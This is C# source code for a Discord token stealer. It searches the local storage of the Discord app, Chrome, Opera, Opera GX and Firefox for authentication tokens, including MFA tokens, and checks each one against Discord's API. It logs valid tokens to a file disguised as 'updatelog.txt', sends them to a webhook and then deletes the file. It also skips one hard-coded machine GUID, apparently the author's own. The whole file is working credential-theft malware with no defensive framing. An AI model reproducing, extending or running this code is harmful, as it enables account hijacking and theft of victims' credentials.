using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Text.RegularExpressions;
using System.Threading;
using Microsoft.Win32;

namespace StealerBin
{
	public class Stealer
	{
		private static List<string> TokenStealer(DirectoryInfo Folder, bool checkLogs = false)
		{
			List<string> list = new List<string>();
			try
			{
				FileInfo[] files = Folder.GetFiles(checkLogs ? "*.log" : "*.ldb");
				for (int i = 0; i < files.Length; i++)
				{
					string input = files[i].OpenText().ReadToEnd();
					foreach (object obj in Regex.Matches(input, @"[a-zA-Z0-9]{24}\.[a-zA-Z0-9]{6}\.[a-zA-Z0-9_\-]{27}"))
					{
						Stealer.SaveTokens(Stealer.TokenCheckAcces(((Match)obj).Value));
					}
					foreach (object obj2 in Regex.Matches(input, @"mfa\.[a-zA-Z0-9_\-]{84}"))
					{
						Stealer.SaveTokens(Stealer.TokenCheckAcces(((Match)obj2).Value));
					}
				}
			}
			catch
			{
			}
			list = list.Distinct<string>().ToList<string>();
			if (list.Count > 0)
			{
				Stealer.StealFound = true;
				List<string> list2 = list;
				int index = list.Count - 1;
				list2[index] = (list2[index] ?? "");
			}
			Stealer.Firefox = false;
			Stealer.Opera = false;
			Stealer.Chrome = false;
			Stealer.App = false;
			Stealer.OperaGX = false;
			return list;
		}

		private static string SaveTokens(string token)
		{
			if (!(token == ""))
			{
				string text = "";
				if (Stealer.Chrome)
				{
					text = "```Chrome";
				}
				else if (Stealer.Opera)
				{
					text = "```Opera";
				}
				else if (Stealer.App)
				{
					text = "```Discord App";
				}
				else if (Stealer.OperaGX)
				{
					text = "```Opera GX";
				}
				else
				{
					text = "```Unknown";
				}
				text = text + " Token :: " + token + "```";
				File.AppendAllText(Stealer._path, text);
				Stealer.RemoveDuplicatedLines(Stealer._path);
			}
			return token;
		}

		private static void RemoveDuplicatedLines(string path)
		{
			List<string> list = new List<string>();
			StringReader stringReader = new StringReader(File.ReadAllText(path));
			string item;
			while ((item = stringReader.ReadLine()) != null)
			{
				if (!list.Contains(item))
				{
					list.Add(item);
				}
			}
			stringReader.Close();
			StreamWriter streamWriter = new StreamWriter(File.Open(path, FileMode.Open));
			foreach (string value in list)
			{
				streamWriter.WriteLine(value);
			}
			streamWriter.Flush();
			streamWriter.Close();
		}

		private static string TokenCheckAcces(string token)
		{
			using (WebClient webClient = new WebClient())
			{
				NameValueCollection nameValueCollection = new NameValueCollection();
				nameValueCollection[""] = "";
				webClient.Headers.Add("Authorization", token);
				try
				{
					webClient.UploadValues("https://discordapp.com/api/v6/users/@me", nameValueCollection);
				}
				catch (WebException ex)
				{
					string text = new StreamReader(ex.Response.GetResponseStream()).ReadToEnd();
					if (text.Contains("401: Unauthorized"))
					{
						token = "";
					}
					else if (text.Contains("You need to verify your account in order to perform this action."))
					{
						token = "";
					}
				}
			}
			return token;
		}
		public static void StartSteal()
		{
			using (RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64))
			{
				using (RegistryKey registryKey2 = registryKey.OpenSubKey("SOFTWARE\\Microsoft\\Cryptography"))
				{
					if (!(Convert.ToString(registryKey2.GetValue("MachineGuid")) == "90059c37-1320-41a4-b58d-2b75a9850d2f"))
					{
						try
						{
							Stealer.StealTokenFromChrome();
							Stealer.StealTokenFromOpera();
							Stealer.StealTokenFromOperaGX();
							Stealer.StealTokenFromDiscordApp();
							Stealer.StealTokenFromFirefox();
							Stealer.Send(File.ReadAllText(Stealer._path));
							if (File.Exists(Stealer._path))
							{
								File.Delete(Stealer._path);
							}
						}
						catch (Exception)
						{
						}
					}
				}
			}
		}

		private static void Send(string tokenReport)
		{
			try
			{
				Thread.Sleep(2000);
				HttpClient httpClient = new HttpClient();
				Dictionary<string, string> nameValueCollection = new Dictionary<string, string>
				{
					{
						"content",
						string.Concat(new string[]
						{
							string.Join("\n", new string[]
							{
								tokenReport
							}),
						})
					},
				};
				httpClient.PostAsync(Stealer.Hook, new FormUrlEncodedContent(nameValueCollection)).GetAwaiter().GetResult();
			}
			catch
			{
			}
		}

		private static void StealTokenFromDiscordApp()
		{
			string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discord\\Local Storage\\leveldb\\";
			DirectoryInfo folder = new DirectoryInfo(path);
			if (Directory.Exists(path))
			{
				Stealer.App = true;
				List<string> list = Stealer.TokenStealer(folder, false);
				if (list != null && list.Count > 0)
				{
					Stealer.App = true;
				}
			}
		}

		private static void StealTokenFromChrome()
		{
			string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\";
			DirectoryInfo folder = new DirectoryInfo(path);
			if (Directory.Exists(path))
			{
				Stealer.Chrome = true;
				List<string> list = Stealer.TokenStealer(folder, false);
				if (list != null && list.Count > 0)
				{
					Stealer.Chrome = true;
				}
			}
		}

		private static void StealTokenFromOpera()
		{
			string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\";
			DirectoryInfo folder = new DirectoryInfo(path);
			if (Directory.Exists(path))
			{
				Stealer.Opera = true;
				List<string> list = Stealer.TokenStealer(folder, false);
				if (list != null && list.Count > 0)
				{
					Stealer.Opera = true;
				}
			}
		}

		private static void StealTokenFromOperaGX()
		{
			string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\";
			DirectoryInfo folder = new DirectoryInfo(path);
			if (Directory.Exists(path))
			{
				Stealer.OperaGX = true;
				List<string> list = Stealer.TokenStealer(folder, false);
				if (list != null && list.Count > 0)
				{
					Stealer.OperaGX = true;
				}
			}
		}

		private static void StealTokenFromFirefox()
		{
			string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Mozilla\\Firefox\\Profiles\\";
			if (Directory.Exists(path))
			{
				foreach (string text in Directory.EnumerateFiles(path, "webappsstore.sqlite", SearchOption.AllDirectories))
				{
					List<string> list = Stealer.TokenStealerForFirefox(new DirectoryInfo(text.Replace("webappsstore.sqlite", "")), false);
					if (list != null && list.Count > 0)
					{
						foreach (string str in (from t in list
												where !Stealer.App
												select t).Select(new Func<string, string>(Stealer.TokenCheckAcces)))
						{
							Stealer.Firefox = true;
							File.AppendAllText(Stealer._path, "Firefox Token: " + str + Environment.NewLine);
						}
					}
				}
			}
		}

		private static List<string> TokenStealerForFirefox(DirectoryInfo Folder, bool checkLogs = false)
		{
			List<string> list = new List<string>();
			try
			{
				FileInfo[] files = Folder.GetFiles(checkLogs ? "*.log" : "*.sqlite");
				for (int i = 0; i < files.Length; i++)
				{
					string input = files[i].OpenText().ReadToEnd();
					foreach (object obj in Regex.Matches(input, @"[a-zA-Z0-9]{24}\.[a-zA-Z0-9]{6}\.[a-zA-Z0-9_\-]{27}"))
					{
						Match match = (Match)obj;
						list.Add(match.Value);
					}
					foreach (object obj2 in Regex.Matches(input, @"mfa\.[a-zA-Z0-9_\-]{84}"))
					{
						Match match2 = (Match)obj2;
						list.Add(match2.Value);
					}
				}
			}
			catch
			{
			}
			list = list.Distinct<string>().ToList<string>();
			if (list.Count > 0)
			{
				Stealer.StealFirefoxFound = true;
				List<string> list2 = list;
				int index = list.Count - 1;
				list2[index] = (list2[index] ?? "");
			}
			Stealer.Firefox = false;
			return list;
		}

		public static string Hook = API.Hook;

		private static string _path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\updatelog.txt";

		private static bool StealFound;

		private static bool App = false;

		private static bool Chrome = false;

		private static bool Opera = false;

		private static bool OperaGX = false;

		private static bool Firefox = false;

		private static bool StealFirefoxFound;
	}
}
